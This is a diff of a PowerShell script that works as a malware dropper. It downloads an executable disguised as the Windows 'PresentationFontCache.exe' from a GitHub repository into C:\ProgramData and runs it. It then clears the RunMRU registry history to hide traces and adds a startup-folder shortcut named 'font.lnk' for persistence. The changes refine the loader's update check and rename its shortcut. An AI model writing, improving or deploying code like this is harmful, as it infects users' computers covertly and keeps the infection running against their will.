@@ -1,20 +1,35 @@
-Start-Sleep -s 10
+Start-Sleep -s 30
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$down = New-Object System.Net.WebClient
 $url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
 $file_text = "C:\ProgramData\version.txt"
-$down.DownloadFile($url_text,$file_text)
-$url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
-$file = "C:\ProgramData\PresentationFontCache.exe"
-$version = Get-Content $file_text
-if ($version.Trim() -ne (Invoke-WebRequest $url_text).Content.Trim()) {
+
+# Check if the version has changed
+if ((Test-Path $file_text) -and (Get-Content $file_text) -eq (Invoke-WebRequest $url_text).Content) {
+    # Version has not changed, just run the existing exe file
+    $file = "C:\ProgramData\PresentationFontCache.exe"
+} else {
+    # Version has changed, download the new exe file
+    $down = New-Object System.Net.WebClient
+    $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
+    $file = "C:\ProgramData\PresentationFontCache.exe"
     $down.DownloadFile($url,$file)
+
+    # Update the version file
+    Set-Content $file_text (Invoke-WebRequest $url_text).Content
 }
+
+# Run the exe file
 $exec = New-Object -com shell.application
 $exec.shellexecute($file)
+
+# Delete registry entry
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Create shortcut in startup folder
 $objShell = New-Object -ComObject ("WScript.Shell")
-$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_OTP.lnk.lnk")
-$objShortCut.TargetPath="C:\ProgramData\PresentationFontCache.exe"
+$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\font.lnk")
+$objShortCut.TargetPath = $file
 $objShortCut.Save()
+
+# Exit the script
 exit
